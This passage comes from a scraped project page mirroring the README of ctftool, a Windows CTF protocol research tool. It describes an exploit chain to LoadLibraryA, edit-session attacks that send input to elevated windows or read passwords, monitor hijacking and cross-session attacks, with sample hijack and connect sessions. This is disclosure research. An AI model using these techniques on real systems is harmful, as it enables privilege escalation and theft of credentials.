+we can redirect execution to <code>kernel32!LoadLibraryA</code> by bouncing between them.</p>
+<p>This was complicated, but the jump sequence works like this:</p>
+<p><a href="https://github.com/taviso/ctftool/blob/master/docs/exploit-chain-sequence.png" target="_blank" rel="nofollow"><img src="https://raw.githubusercontent.com/taviso/ctftool/master/docs/exploit-chain-sequence.png" alt="Exploit Chain Sequence" style="max-width:100%;"></a></p>
+<p>If you're interested, I recommend watching it in a debugger. Note that you will
+need to use the command <code>sxd av</code> and <code>sxd bpe</code> or the debugger will stop for
+every write!</p>
+<h2>
+<a id="edit-session-attacks" class="anchor" href="#edit-session-attacks" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Edit Session Attacks</h2>
+<p>Apart from memory corruption, a major vulnerability class exposed by CTF are
+<em>edit session attacks</em>. Normally, an unprivileged process (for example, low
+integrity) would not be permitted to send input or read data from a high
+privileged process. This security boundary is called UIPI, <em>User Interface
+Privilege Isolation</em>.</p>
+<p>CTF breaks these assumptions, and allows unprivileged processes to send input
+to privileged processes.</p>
+<p>There are some requirements for this attack to work, as far as I'm aware it
+will only work if you have a display language installed that uses an OoP TIP,
+<em>out-of-process text input processor</em>. Users with input languages that use IMEs
+(Chinese, Japanese, Korean, and so on) and users with a11y tools fall into this
+category.</p>
+<p>Example attacks include...</p>
+<ul>
+<li>Sending commands to an elevated command window.</li>
+<li>Reading passwords out of dialogs or the login screen.</li>
+<li>Escaping IL/AppContainer sandboxes by sending input to unsandboxed windows.</li>
+</ul>
+<p>There is an example <a href="https://github.com/taviso/ctftool/blob/master/scripts/ctf-demo-editsession.ctf" rel="nofollow">script</a> in the scripts
+directory that will send input to a notepad window to demonstrate how edit
+sessions work.</p>
+<p><a href="https://github.com/taviso/ctftool/blob/master/docs/edit-session-full.png" rel="nofollow"><img src="https://raw.githubusercontent.com/taviso/ctftool/master/docs/edit-thumb.png" alt="Edit Session Screenshot" style="max-width:100%;"></a></p>
+<h2>
+<a id="monitor-hijacking" class="anchor" href="#monitor-hijacking" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Monitor Hijacking</h2>
+<p>Because there is no authentication involved between clients and servers in the
+CTF protocol, an attacker with the necessary privileges to write to
+<code>\BaseNamedObjects</code> can create the CTF ALPC port and pretend to be the monitor.</p>
+<p>This allows any and all restrictions enforced by the monitor to be bypassed.</p>
+<p>If you want to experiment with this attack, try the <code>hijack</code> command in <code>ctftool</code>.</p>
+<pre><code>An interactive ctf exploration tool by @taviso.
+Type "help" for available commands.
+ctf&gt; hijack Default 1
+NtAlpcCreatePort("\BaseNamedObjects\msctf.serverDefault1") =&gt; 0 00000218
+NtAlpcSendWaitReceivePort("\BaseNamedObjects\msctf.serverDefault1") =&gt; 0 00000218
+000000: 18 00 30 00 0a 20 00 00 00 11 00 00 44 11 00 00  ..0.. ......D...
+000010: a4 86 00 00 b7 66 b8 00 00 11 00 00 44 11 00 00  .....f......D...
+000020: e7 12 01 00 0c 00 00 00 80 01 02 00 20 10 d6 05  ............ ...
+A a message received
+        ProcessID: 4352, SearchUI.exe
+        ThreadId: 4420
+        WindowID: 00020180
+NtAlpcSendWaitReceivePort("\BaseNamedObjects\msctf.serverDefault1") =&gt; 0 00000218
+000000: 18 00 30 00 0a 20 00 00 ac 0f 00 00 0c 03 00 00  ..0.. ..........
+000010: ec 79 00 00 fa 66 b8 00 ac 0f 00 00 0c 03 00 00  .y...f..........
+000020: 12 04 01 00 08 00 00 00 10 01 01 00 00 00 00 00  ................
+A a message received
+        ProcessID: 4012, explorer.exe
+        ThreadId: 780
+        WindowID: 00010110
+NtAlpcSendWaitReceivePort("\BaseNamedObjects\msctf.serverDefault1") =&gt; 0 00000218
+000000: 18 00 30 00 0a 20 00 00 ac 0f 00 00 0c 03 00 00  ..0.. ..........
+000010: fc 8a 00 00 2a 67 b8 00 ac 0f 00 00 0c 03 00 00  ....*g..........
+000020: 12 04 01 00 08 00 00 00 10 01 01 00 58 00 00 00  ............X...
+A a message received
+        ProcessID: 4012, explorer.exe
+        ThreadId: 780
+...
+</code></pre>
+<h2>
+<a id="cross-session-attacks" class="anchor" href="#cross-session-attacks" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Cross Session Attacks</h2>
+<p>There is no session isolation in the CTF protocol, any process can connect to
+any CTF server. For example, a Terminal Services user can interact with the
+processes of any other user, even the Administrator.</p>
+<p>The <code>connect</code> command in <code>ctftool</code> supports connecting to non-default sessions
+if you want to experiment with this attack.</p>
+<pre><code>An interactive ctf exploration tool by @taviso.
+Type "help" for available commands.
+Most commands require a connection, see "help connect".
+ctf&gt; help connect
+Connect to CTF ALPC Port.
+
+Usage: connect [DESKTOPNAME SESSIONID]
+Without any parameters, connect to the ctf monitor for the current
+desktop and session. All subsequent commands will use this connection
+for communicating with the ctf monitor.
+
+If a connection is already open, the existing connection is closed first.
+
+If DESKTOPNAME and SESSIONID are specified, a connection to ctf monitor
+for another desktop and session are opened, if it exists.
+If the specified port does not exist, wait until it does exist. This is
+so that you can wait for a session that hasn't started
+yet in a script.
+Examples
+ Connect to the monitor for current desktop
+  ctf&gt; connect
+ Connect to a specific desktop and session.
+  ctf&gt; connect Default 1
+Most commands require a connection, see "help connect".
+</code></pre>
+<h2>
+<a id="status" class="anchor" href="#status" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Status</h2>
+<p>At the time of writing, it is unknown how Microsoft will change the CTF
+protocol in response to the numerous design flaws this tool helped expose.</p>
+<p>For that reason, consider this tool to be in proof-of-concept state.</p>
+<h3>
+<a id="supported-versions-and-platforms" class="anchor" href="#supported-versions-and-platforms" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Supported Versions and Platforms</h3>
+<p>All versions of Windows since Windows XP use CTF, on all supported platforms.</p>
+<p>While not part of the base system until XP, versions as early as Windows 98 and
+NT4 would use CTF if you installed Microsoft Office.</p>
+<p><code>ctftool</code> supports Windows 7 and later on x86 and x64, but earlier versions and
+other platforms <em>could</em> be supported, and contributions would be appreciated.</p>
+<h2>
+<a id="acronym" class="anchor" href="#acronym" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Acronym</h2>
+<p>Microsoft doesn't document what CTF stands for, it's not explained in any
+of the Text Services documentation, SDK samples, symbol names, header files,
+or anywhere else. My theory is it's from <code>CTextFramework</code>, what you might name
+the class in <a href="http://web.mst.edu/%7Ecpp/common/hungarian.html" rel="nofollow">hungarian notation</a>.</p>
+<blockquote>
+<p>There are some websites that claim <code>ctfmon</code> has something to do with Clear
+Type Fonts or the Azure Collaborative Translation Framework. They're mistaken.</p>
+</blockquote>
+<blockquote>
+<p>Update: <a href="https://twitter.com/JakeNelsonMN/status/1161513319049703424" rel="nofollow">Jake Nelson</a> finds
+evidence for "<a href="https://patents.google.com/patent/US20040150670#P-0091" rel="nofollow">Common Text Framework</a>"</p>
+</blockquote>
+<h2>
+<a id="authors" class="anchor" href="#authors" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Authors</h2>
+<p>Tavis Ormandy <a href="/cdn-cgi/l/email-protection#c5b1a4b3acb6aa85a2a8a4aca9eba6aaa8" rel="nofollow"><span class="__cf_email__" data-cfemail="99edf8eff0eaf6d9fef4f8f0f5b7faf6f4">[email&#160;protected]</span></a></p>
+<h2>
+<a id="license" class="anchor" href="#license" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>License</h2>
+<p>All original code is Apache 2.0, See LICENSE file for details.</p>
+<p>The following components are imported third party projects.</p>
+<ul>
+<li>
+<a href="https://github.com/trailofbits/pe-parse" rel="nofollow">pe-parse</a>, by Andrew Ruef et al.
+<ul>
+<li>pe-parse is used to implement a <code>GetProcAddress()</code> for 64-bit modules from a
+32-bit process. This is used in the <code>symbol</code> command, and allows the same
+binary to work on x64 and x86.</li>
+</ul>
+</li>
+<li>
+<a href="http://mingweditline.sourceforge.net/" rel="nofollow">wineditline</a>, by Paolo Tosco.
+<ul>
+<li>wineditline is used to implement user friendly command-line input and
+history editing.</li>
+</ul>
+</li>
+<li>
+<a href="https://www.dynamorio.org/" rel="nofollow">dynamorio</a>, by Derek Bruening et al.
+<ul>
+<li>I borrowed some of the prototypes and type definitions from DR.</li>
+</ul>
+</li>
+<li>
+<a href="http://www.zezula.net/en/prog/lpc.html" rel="nofollow">ntdll.h</a>, by Ladislav Zezula.
+<ul>
+<li>Ladislav collected some structure definitions and prototoypes from
+various WDK, DDK, SDK releases into one convenient file.</li>
+</ul>
+</li>
+</ul>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">(function(){window['__CF$cv$params']={r:'6120b9991f2be738',m:'f7f8e9af635f8d737680c97b5aa93e53ea9810a0-1610725538-1800-AcNtrbfKFUC/YeN1ssSNnneURRAPlag7GDzy27hJKxmxpkZ3S3FZwJE1flV09ILM81ka168N+N0Mf4VcckFWwWX8h/J7JwPpdozHOFDsNy0YayfxK1rbLgyUK7DD1nvcCLLF0xU6QZ51OlVwTsAzfjg=',s:[0xf3ff6ecc77,0xcf119154ca],}})();</script></body></html>
+</div><div><br/><div style="border:1px solid gray;border-radius:5px;background-color:lightgray;padding:2%"><div style="font-size:24px;font-weight:bold;margin-bottom:10px">Get A Weekly Email With Trending Projects For These Topics</div><div style="margin-bottom:10px">No Spam.  Unsubscribe easily at any time.</div><div><div><input type="checkbox" name="topics" value="c"/> <!-- -->c<!-- --> (<!-- -->14,340<!-- -->) </div><div><input type="checkbox" name="topics" value="security"/> <!-- -->security<!-- --> (<!-- -->1,760<!-- -->) </div><div><input type="checkbox" name="topics" value="windows"/> <!-- -->windows<!-- --> (<!-- -->1,331<!-- -->) </div><div><input type="checkbox" name="topics" value="reverse-engineering"/> <!-- -->reverse-engineering<!-- --> (<!-- -->446<!-- -->) </div></div><div><input type="email" style="width:95%;margin-top:10px;margin-bottom:10px;padding:5px;font-size:20px;border-radius:5px" name="email" placeholder="Your email address"/></div><div><input type="submit" style="color:white;background-color:#0366d6;font-size:20px;border:1px solid black;border-radius:5px;padding:5px;cursor:pointer" value="Subscribe"/></div></div></div><h2>Find Open Source By Browsing 7,000 Topics Across 59 Categories</h2><div class="aos_topics_sidebar" style="margin:0;width:100%"><div class="category_topic_filter_container"><input style="width:100%" placeholder="Search, browse and combine topics" value="" class="aos_filter_topics_input"/></div><div style="display:block;box-shadow:1px 1px 5px lightgray"><a data-category-name="Advertising" href="https://awesomeopensource.com/categories/advertising"><div class="aos_category_explorer_category_container" data-category-name="Advertising"><span data-category-name="Advertising">Advertising<span data-category-name="Advertising" class="aos_project_count"> 📦 <!-- -->10</span></span></div></a><a data-category-name="All Projects" href="https://awesomeopensource.com/projects"><div class="aos_category_explorer_category_container" data-category-name="All Projects"><span data-category-name="All Projects">All Projects</span></div></a><a data-category-name="Application Programming Interfaces" href="https://awesomeopensource.com/categories/application-programming-interfaces"><div class="aos_category_explorer_category_container" data-category-name="Application Programming Interfaces"><span data-category-name="Application Programming Interfaces">Application Programming Interfaces<span data-category-name="Application Programming Interfaces" class="aos_project_count"> 📦 <!-- -->124</span></span></div></a><a data-category-name="Applications" href="https://awesomeopensource.com/categories/applications"><div class="aos_category_explorer_category_container" data-category-name="Applications"><span data-category-name="Applications">Applications<span data-category-name="Applications" class="aos_project_count"> 📦 <!-- -->192</span></span></div></a><a data-category-name="Artificial Intelligence" href="https://awesomeopensource.com/categories/artificial-intelligence"><div class="aos_category_explorer_category_container" data-category-name="Artificial Intelligence"><span data-category-name="Artificial Intelligence">Artificial Intelligence<span data-category-name="Artificial Intelligence" class="aos_project_count"> 📦 <!-- -->78</span></span></div></a><a data-category-name="Blockchain" href="https://awesomeopensource.com/categories/blockchain"><div class="aos_category_explorer_category_container" data-category-name="Blockchain"><span data-category-name="Blockchain">Blockchain<span data-category-name="Blockchain" class="aos_project_count"> 📦 <!-- -->73</span></span></div></a><a data-category-name="Build Tools" href="https://awesomeopensource.com/categories/build-tools"><div class="aos_category_explorer_category_container" data-category-name="Build Tools"><span data-category-name="Build Tools">Build Tools<span data-category-name="Build Tools" class="aos_project_count"> 📦 <!-- -->113</span></span></div></a><a data-category-name="Cloud Computing" href="https://awesomeopensource.com/categories/cloud-computing"><div class="aos_category_explorer_category_container" data-category-name="Cloud Computing"><span data-category-name="Cloud Computing">Cloud Computing<span data-category-name="Cloud Computing" class="aos_project_count"> 📦 <!-- -->80</span></span></div></a><a data-category-name="Code Quality" href="https://awesomeopensource.com/categories/code-quality"><div class="aos_category_explorer_category_container" data-category-name="Code Quality"><span data-category-name="Code Quality">Code Quality<span data-category-name="Code Quality" class="aos_project_count"> 📦 <!-- -->28</span></span></div></a><a data-category-name="Collaboration" href="https://awesomeopensource.com/categories/collaboration"><div class="aos_category_explorer_category_container" data-category-name="Collaboration"><span data-category-name="Collaboration">Collaboration<span data-category-name="Collaboration" class="aos_project_count"> 📦 <!-- -->32</span></span></div></a><a data-category-name="Command Line Interface" href="https://awesomeopensource.com/categories/command-line-interface"><div class="aos_category_explorer_category_container" data-category-name="Command Line Interface"><span data-category-name="Command Line Interface">Command Line Interface<span data-category-name="Command Line Interface" class="aos_project_count"> 📦 <!-- -->49</span></span></div></a><a data-category-name="Community" href="https://awesomeopensource.com/categories/community"><div class="aos_category_explorer_category_container" data-category-name="Community"><span data-category-name="Community">Community<span data-category-name="Community" class="aos_project_count"> 📦 <!-- -->83</span></span></div></a><a data-category-name="Companies" href="https://awesomeopensource.com/categories/companies"><div class="aos_category_explorer_category_container" data-category-name="Companies"><span data-category-name="Companies">Companies<span data-category-name="Companies" class="aos_project_count"> 📦 <!-- -->60</span></span></div></a><a data-category-name="Compilers" href="https://awesomeopensource.com/categories/compilers"><div class="aos_category_explorer_category_container" data-category-name="Compilers"><span data-category-name="Compilers">Compilers<span data-category-name="Compilers" class="aos_project_count"> 📦 <!-- -->63</span></span></div></a><a data-category-name="Computer Science" href="https://awesomeopensource.com/categories/computer-science"><div class="aos_category_explorer_category_container" data-category-name="Computer Science"><span data-category-name="Computer Science">Computer Science<span data-category-name="Computer Science" class="aos_project_count"> 📦 <!-- -->80</span></span></div></a><a data-category-name="Configuration Management" href="https://awesomeopensource.com/categories/configuration-management"><div class="aos_category_explorer_category_container" data-category-name="Configuration Management"><span data-category-name="Configuration Management">Configuration Management<span data-category-name="Configuration Management" class="aos_project_count"> 📦 <!-- -->42</span></span></div></a><a data-category-name="Content Management" href="https://awesomeopensource.com/categories/content-management"><div class="aos_category_explorer_category_container" data-category-name="Content Management"><span data-category-name="Content Management">Content Management<span data-category-name="Content Management" class="aos_project_count"> 📦 <!-- -->175</span></span></div></a><a data-category-name="Control Flow" href="https://awesomeopensource.com/categories/control-flow"><div class="aos_category_explorer_category_container" data-category-name="Control Flow"><span data-category-name="Control Flow">Control Flow<span data-category-name="Control Flow" class="aos_project_count"> 📦 <!-- -->213</span></span></div></a><a data-category-name="Data Formats" href="https://awesomeopensource.com/categories/data-formats"><div class="aos_category_explorer_category_container" data-category-name="Data Formats"><span data-category-name="Data Formats">Data Formats<span data-category-name="Data Formats" class="aos_project_count"> 📦 <!-- -->78</span></span></div></a><a data-category-name="Data Processing" href="https://awesomeopensource.com/categories/data-processing"><div class="aos_category_explorer_category_container" data-category-name="Data Processing"><span data-category-name="Data Processing">Data Processing<span data-category-name="Data Processing" class="aos_project_count"> 📦 <!-- -->276</span></span></div></a><a data-category-name="Data Storage" href="https://awesomeopensource.com/categories/data-storage"><div class="aos_category_explorer_category_container" data-category-name="Data Storage"><span data-category-name="Data Storage">Data Storage<span data-category-name="Data Storage" class="aos_project_count"> 📦 <!-- -->135</span></span></div></a><a data-category-name="Economics" href="https://awesomeopensource.com/categories/economics"><div class="aos_category_explorer_category_container" data-category-name="Economics"><span data-category-name="Economics">Economics<span data-category-name="Economics" class="aos_project_count"> 📦 <!-- -->64</span></span></div></a><a data-category-name="Frameworks" href="https://awesomeopensource.com/categories/frameworks"><div class="aos_category_explorer_category_container" data-category-name="Frameworks"><span data-category-name="Frameworks">Frameworks<span data-category-name="Frameworks" class="aos_project_count"> 📦 <!-- -->215</span></span></div></a><a data-category-name="Games" href="https://awesomeopensource.com/categories/games"><div class="aos_category_explorer_category_container" data-category-name="Games"><span data-category-name="Games">Games<span data-category-name="Games" class="aos_project_count"> 📦 <!-- -->129</span></span></div></a><a data-category-name="Graphics" href="https://awesomeopensource.com/categories/graphics"><div class="aos_category_explorer_category_container" data-category-name="Graphics"><span data-category-name="Graphics">Graphics<span data-category-name="Graphics" class="aos_project_count"> 📦 <!-- -->110</span></span></div></a><a data-category-name="Hardware" href="https://awesomeopensource.com/categories/hardware"><div class="aos_category_explorer_category_container" data-category-name="Hardware"><span data-category-name="Hardware">Hardware<span data-category-name="Hardware" class="aos_project_count"> 📦 <!-- -->152</span></span></div></a><a data-category-name="Integrated Development Environments" href="https://awesomeopensource.com/categories/integrated-development-environments"><div class="aos_category_explorer_category_container" data-category-name="Integrated Development Environments"><span data-category-name="Integrated Development Environments">Integrated Development Environments<span data-category-name="Integrated Development Environments" class="aos_project_count"> 📦 <!-- -->49</span></span></div></a><a data-category-name="Learning Resources" href="https://awesomeopensource.com/categories/learning-resources"><div class="aos_category_explorer_category_container" data-category-name="Learning Resources"><span data-category-name="Learning Resources">Learning Resources<span data-category-name="Learning Resources" class="aos_project_count"> 📦 <!-- -->166</span></span></div></a><a data-category-name="Legal" href="https://awesomeopensource.com/categories/legal"><div class="aos_category_explorer_category_container" data-category-name="Legal"><span data-category-name="Legal">Legal<span data-category-name="Legal" class="aos_project_count"> 📦 <!-- -->29</span></span></div></a><a data-category-name="Libraries" href="https://awesomeopensource.com/categories/libraries"><div class="aos_category_explorer_category_container" data-category-name="Libraries"><span data-category-name="Libraries">Libraries<span data-category-name="Libraries" class="aos_project_count"> 📦 <!-- -->129</span></span></div></a><a data-category-name="Lists Of Projects" href="https://awesomeopensource.com/categories/lists-of-projects"><div class="aos_category_explorer_category_container" data-category-name="Lists Of Projects"><span data-category-name="Lists Of Projects">Lists Of Projects<span data-category-name="Lists Of Projects" class="aos_project_count"> 📦 <!-- -->22</span></span></div></a><a data-category-name="Machine Learning" href="https://awesomeopensource.com/categories/machine-learning"><div class="aos_category_explorer_category_container" data-category-name="Machine Learning"><span data-category-name="Machine Learning">Machine Learning<span data-category-name="Machine Learning" class="aos_project_count"> 📦 <!-- -->347</span></span></div></a><a data-category-name="Mapping" href="https://awesomeopensource.com/categories/mapping"><div class="aos_category_explorer_category_container" data-category-name="Mapping"><span data-category-name="Mapping">Mapping<span data-category-name="Mapping" class="aos_project_count"> 📦 <!-- -->64</span></span></div></a><a data-category-name="Marketing" href="https://awesomeopensource.com/categories/marketing"><div class="aos_category_explorer_category_container" data-category-name="Marketing"><span data-category-name="Marketing">Marketing<span data-category-name="Marketing" class="aos_project_count"> 📦 <!-- -->15</span></span></div></a><a data-category-name="Mathematics" href="https://awesomeopensource.com/categories/mathematics"><div class="aos_category_explorer_category_container" data-category-name="Mathematics"><span data-category-name="Mathematics">Mathematics<span data-category-name="Mathematics" class="aos_project_count"> 📦 <!-- -->55</span></span></div></a><a data-category-name="Media" href="https://awesomeopensource.com/categories/media"><div class="aos_category_explorer_category_container" data-category-name="Media"><span data-category-name="Media">Media<span data-category-name="Media" class="aos_project_count"> 📦 <!-- -->239</span></span></div></a><a data-category-name="Messaging" href="https://awesomeopensource.com/categories/messaging"><div class="aos_category_explorer_category_container" data-category-name="Messaging"><span data-category-name="Messaging">Messaging<span data-category-name="Messaging" class="aos_project_count"> 📦 <!-- -->98</span></span></div></a><a data-category-name="Networking" href="https://awesomeopensource.com/categories/networking"><div class="aos_category_explorer_category_container" data-category-name="Networking"><span data-category-name="Networking">Networking<span data-category-name="Networking" class="aos_project_count"> 📦 <!-- -->315</span></span></div></a><a data-category-name="Operating Systems" href="https://awesomeopensource.com/categories/operating-systems"><div class="aos_category_explorer_category_container" data-category-name="Operating Systems"><span data-category-name="Operating Systems">Operating Systems<span data-category-name="Operating Systems" class="aos_project_count"> 📦 <!-- -->89</span></span></div></a><a data-category-name="Operations" href="https://awesomeopensource.com/categories/operations"><div class="aos_category_explorer_category_container" data-category-name="Operations"><span data-category-name="Operations">Operations<span data-category-name="Operations" class="aos_project_count"> 📦 <!-- -->121</span></span></div></a><a data-category-name="Package Managers" href="https://awesomeopensource.com/categories/package-managers"><div class="aos_category_explorer_category_container" data-category-name="Package Managers"><span data-category-name="Package Managers">Package Managers<span data-category-name="Package Managers" class="aos_project_count"> 📦 <!-- -->55</span></span></div></a><a data-category-name="Programming Languages" href="https://awesomeopensource.com/categories/programming-languages"><div class="aos_category_explorer_category_container" data-category-name="Programming Languages"><span data-category-name="Programming Languages">Programming Languages<span data-category-name="Programming Languages" class="aos_project_count"> 📦 <!-- -->245</span></span></div></a><a data-category-name="Runtime Environments" href="https://awesomeopensource.com/categories/runtime-environments"><div class="aos_category_explorer_category_container" data-category-name="Runtime Environments"><span data-category-name="Runtime Environments">Runtime Environments<span data-category-name="Runtime Environments" class="aos_project_count"> 📦 <!-- -->100</span></span></div></a><a data-category-name="Science" href="https://awesomeopensource.com/categories/science"><div class="aos_category_explorer_category_container" data-category-name="Science"><span data-category-name="Science">Science<span data-category-name="Science" class="aos_project_count"> 📦 <!-- -->42</span></span></div></a><a data-category-name="Security" href="https://awesomeopensource.com/categories/security"><div class="aos_category_explorer_category_container" data-category-name="Security"><span data-category-name="Security">Security<span data-category-name="Security" class="aos_project_count"> 📦 <!-- -->396</span></span></div></a><a data-category-name="Social Media" href="https://awesomeopensource.com/categories/social-media"><div class="aos_category_explorer_category_container" data-category-name="Social Media"><span data-category-name="Social Media">Social Media<span data-category-name="Social Media" class="aos_project_count"> 📦 <!-- -->27</span></span></div></a><a data-category-name="Software Architecture" href="https://awesomeopensource.com/categories/software-architecture"><div class="aos_category_explorer_category_container" data-category-name="Software Architecture"><span data-category-name="Software Architecture">Software Architecture<span data-category-name="Software Architecture" class="aos_project_count"> 📦 <!-- -->72</span></span></div></a><a data-category-name="Software Development" href="https://awesomeopensource.com/categories/software-development"><div class="aos_category_explorer_category_container" data-category-name="Software Development"><span data-category-name="Software Development">Software Development<span data-category-name="Software Development" class="aos_project_count"> 📦 <!-- -->72</span></span></div></a><a data-category-name="Software Performance" href="https://awesomeopensource.com/categories/software-performance"><div class="aos_category_explorer_category_container" data-category-name="Software Performance"><span data-category-name="Software Performance">Software Performance<span data-category-name="Software Performance" class="aos_project_count"> 📦 <!-- -->58</span></span></div></a><a data-category-name="Software Quality" href="https://awesomeopensource.com/categories/software-quality"><div class="aos_category_explorer_category_container" data-category-name="Software Quality"><span data-category-name="Software Quality">Software Quality<span data-category-name="Software Quality" class="aos_project_count"> 📦 <!-- -->133</span></span></div></a><a data-category-name="Text Editors" href="https://awesomeopensource.com/categories/text-editors"><div class="aos_category_explorer_category_container" data-category-name="Text Editors"><span data-category-name="Text Editors">Text Editors<span data-category-name="Text Editors" class="aos_project_count"> 📦 <!-- -->49</span></span></div></a><a data-category-name="Text Processing" href="https://awesomeopensource.com/categories/text-processing"><div class="aos_category_explorer_category_container" data-category-name="Text Processing"><span data-category-name="Text Processing">Text Processing<span data-category-name="Text Processing" class="aos_project_count"> 📦 <!-- -->136</span></span></div></a><a data-category-name="User Interface" href="https://awesomeopensource.com/categories/user-interface"><div class="aos_category_explorer_category_container" data-category-name="User Interface"><span data-category-name="User Interface">User Interface<span data-category-name="User Interface" class="aos_project_count"> 📦 <!-- -->330</span></span></div></a><a data-category-name="User Interface Components" href="https://awesomeopensource.com/categories/user-interface-components"><div class="aos_category_explorer_category_container" data-category-name="User Interface Components"><span data-category-name="User Interface Components">User Interface Components<span data-category-name="User Interface Components" class="aos_project_count"> 📦 <!-- -->514</span></span></div></a><a data-category-name="Version Control" href="https://awesomeopensource.com/categories/version-control"><div class="aos_category_explorer_category_container" data-category-name="Version Control"><span data-category-name="Version Control">Version Control<span data-category-name="Version Control" class="aos_project_count"> 📦 <!-- -->30</span></span></div></a><a data-category-name="Virtualization" href="https://awesomeopensource.com/categories/virtualization"><div class="aos_category_explorer_category_container" data-category-name="Virtualization"><span data-category-name="Virtualization">Virtualization<span data-category-name="Virtualization" class="aos_project_count"> 📦 <!-- -->71</span></span></div></a><a data-category-name="Web Browsers" href="https://awesomeopensource.com/categories/web-browsers"><div class="aos_category_explorer_category_container" data-category-name="Web Browsers"><span data-category-name="Web Browsers">Web Browsers<span data-category-name="Web Browsers" class="aos_project_count"> 📦 <!-- -->42</span></span></div></a><a data-category-name="Web Servers" href="https://awesomeopensource.com/categories/web-servers"><div class="aos_category_explorer_category_container" data-category-name="Web Servers"><span data-category-name="Web Servers">Web Servers<span data-category-name="Web Servers" class="aos_project_count"> 📦 <!-- -->26</span></span></div></a><a data-category-name="Web User Interface" href="https://awesomeopensource.com/categories/web-user-interface"><div class="aos_category_explorer_category_container" data-category-name="Web User Interface"><span data-category-name="Web User Interface">Web User Interface<span data-category-name="Web User Interface" class="aos_project_count"> 📦 <!-- -->210</span></span></div></a></div></div><div class="aos_project_metadata_trademark_notice">&quot;<!-- -->Ctftool<!-- -->&quot; and other potentially trademarked words, copyrighted images and copyrighted readme contents likely belong to the legal entity who owns the &quot;<a href="https://github.com/taviso" target="_blank">Taviso</a>&quot; organization.  Awesome Open Source is not affiliated with the legal entity who owns the &quot;<a href="https://github.com/taviso" target="_blank">Taviso</a>&quot; organization.</div></div></div><div class="aos_fixed_footer_container"><br/></div></div></div>
+      <script type="application/json" class="js-react-on-rails-component" data-component-name="Root" data-dom-id="Root-react-component-4530f296-cac6-47fb-a256-5e139dabc57c">{"topics":[{"id":null,"name":"javascript","count":67310},{"id":null,"name":"python","count":49729},{"id":null,"name":"java","count":30048},{"id":null,"name":"c-plus-plus","count":17339},{"id":null,"name":"php","count":15812},{"id":null,"name":"c","count":14340},{"id":null,"name":"go","count":14132},{"id":null,"name":"ruby","count":12268},{"id":null,"name":"c-sharp","count":11505},{"id":null,"name":"objective-c","count":10769}],"projectTopics":[{"id":null,"name":"c","count":14340},{"id":null,"name":"reverse-engineering","count":446},{"id":null,"name":"security","count":1760},{"id":null,"name":"windows","count":1331}],"selectedTopics":[],"currentUrl":"https://awesomeopensource.com/project/taviso/ctftool","projects":[],"project":{"id":247720,"created_at":"2019-09-15T15:56:55.747Z","updated_at":"2021-01-14T04:18:08.695Z","markdown_readme":"\u003c!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\"\u003e\n\u003chtml\u003e\u003cbody\u003e\n\u003ch1\u003e\n\u003ca id=\"ctftool\" class=\"anchor\" href=\"#ctftool\" aria-hidden=\"true\"\u003e\u003cspan aria-hidden=\"true\" class=\"octicon octicon-link\"\u003e\u003c/span\u003e\u003c/a\u003eCTFTOOL\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003eJust want to test the SYSTEM exploit? \u003ca href=\"#Exploit\"\u003eClick here\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.youtube.com/watch?v=r3vrzzDpmhc\" rel=\"nofollow\"\u003e\u003cimg src=\"https://raw.githubusercontent.com/taviso/ctftool/master/docs/thumb.png\" alt=\"Video of Exploit\" style=\"max-width:100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003ch2\u003e\n\u003ca id=\"an-interactive-ctf-exploration-tool\" class=\"anchor\" href=\"#an-interactive-ctf-exploration-tool\" aria-hidden=\"true\"\u003e\u003cspan aria-hidden=\"true\" class=\"octicon octicon-link\"\u003e\u003c/span\u003e\u003c/a\u003eAn Interactive CTF Exploration Tool\u003c/h2\u003e\n\u003cp\u003eThis is \u003ccode\u003ectftool\u003c/code\u003e, an interactive command line tool to experiment with CTF, a\nlittle-known protocol used on Windows to implement Text Services. This might\nbe useful for studying Windows internals, debugging complex issues with Text\nInput Processors and analyzing Windows security.\u003c/p\u003e\n\u003cp\u003eIt is possible to write simple scripts with \u003ccode\u003ectftool\u003c/code\u003e for automating interaction\nwith CTF clients or servers, or perform simple fuzzing.\u003c/p\u003e\n\u003ch2\u003e\n\u003ca id=\"background\" class=\"anchor\" href=\"#background\" aria-hidden=\"true\"\u003e\u003cspan aria-hidden=\"true\" class=\"octicon octicon-link\"\u003e\u003c/span\u003e\u003c/a\u003eBackground\u003c/h2\u003e\n\u003cp\u003eThere is a blog post that accompanies the release of this tool available here.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html\" rel=\"nofollow\"\u003ehttps://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html\u003c/a\u003e\u003c/p\u003e\n\u003ch2\u003e\n\u003ca id=\"usage\" class=\"anchor\" href=\"#usage\" aria-hidden=\"true\"\u003e\u003cspan aria-hidden=\"true\" class=\"octicon octicon-link\"\u003e\u003c/span\u003e\u003c/a\u003eUsage\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003ectftool\u003c/code\u003e has been tested on Windows 7, Windows 8 and Windows 10. Both 32-bit\nand x64 versions are supported, but x64 has been tested more extensively.\u003c/p\u003e\n\u003cp\u003eThere is online help for most commands, simply type \u003ccode\u003ehelp\u003c/code\u003e to see a list of\ncommands, and \u003ccode\u003ehelp \u0026lt;command\u0026gt;\u003c/code\u003e to see detailed help for a particular command.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e$ ./ctftool.exe\nAn interactive ctf exploration tool by @taviso.\nType \"help\" for available commands.\nMost commands require a connection, see \"help connect\".\nctf\u0026gt; 